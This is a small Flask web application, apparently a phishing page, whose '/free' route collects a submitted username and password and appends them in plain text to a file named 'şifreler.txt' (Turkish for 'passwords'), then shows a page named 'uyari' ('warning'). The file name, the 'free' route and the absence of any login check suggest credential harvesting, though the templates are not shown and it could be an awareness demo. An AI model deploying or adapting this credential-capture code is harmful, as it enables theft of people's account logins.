from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/")
def main():
    return render_template("index.html")

@app.route("/free", methods=['GET', 'POST'])
def kod():
    if request.method == 'POST':
        isim = request.form.get('isim')
        şifre = request.form.get('şifre')
        
        with open("şifreler.txt", "a") as file:
            file.writelines(f"username: {isim} \npassword: {şifre}\n\n")
        
        return render_template('uyari.html')
    else:
        return render_template('post.html')

app.run()